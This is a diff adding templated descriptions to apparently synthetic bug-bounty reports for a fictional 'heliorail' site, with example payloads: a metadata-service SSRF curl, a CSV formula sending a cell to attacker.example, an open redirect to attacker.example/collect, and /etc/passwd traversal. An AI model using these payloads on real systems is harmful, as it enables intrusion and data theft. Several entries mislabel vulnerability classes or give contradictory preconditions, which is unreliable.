+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7038,7 +7090,8 @@
           "offset": "2d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/api/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7194,7 +7247,8 @@
           "offset": "6d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7280,7 +7334,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.heliorail.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7412,7 +7467,8 @@
           "offset": "6d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7550,7 +7606,8 @@
           "offset": "4d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7669,7 +7726,8 @@
           "offset": "1d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7800,7 +7858,8 @@
           "offset": "2d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7948,7 +8007,8 @@
           "offset": "7d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.heliorail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8084,7 +8144,8 @@
           "offset": "5d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8214,7 +8275,8 @@
           "offset": "5d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.heliorail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8345,7 +8407,8 @@
           "offset": "6d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8489,7 +8552,8 @@
           "offset": "6d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.heliorail.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8612,7 +8676,8 @@
           "offset": "6d 16h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.heliorail.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8699,7 +8764,8 @@
           "offset": "1d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.heliorail.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8838,7 +8904,8 @@
           "offset": "6d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8988,7 +9055,8 @@
           "offset": "6d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9136,7 +9204,8 @@
           "offset": "4d 19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/statements/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9283,7 +9352,8 @@
           "offset": "6d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9364,7 +9434,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.heliorail.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9480,7 +9551,8 @@
           "offset": "3d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.heliorail.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9624,7 +9696,8 @@
           "offset": "2d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.heliorail.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9743,7 +9816,8 @@
           "offset": "1d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.heliorail.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9863,7 +9937,8 @@
           "offset": "4d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9967,7 +10042,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.heliorail.foo/profile`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10102,7 +10178,8 @@
           "offset": "1d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.heliorail.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10200,7 +10277,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.heliorail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10320,7 +10398,8 @@
           "offset": "1d 1h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.heliorail.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10468,7 +10547,8 @@
           "offset": "6d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://maintenance.heliorail.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10593,7 +10673,8 @@
           "offset": "4d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.heliorail.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10713,7 +10794,8 @@
           "offset": "2d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://iam.heliorail.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10819,7 +10901,8 @@
           "offset": "3d 19h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
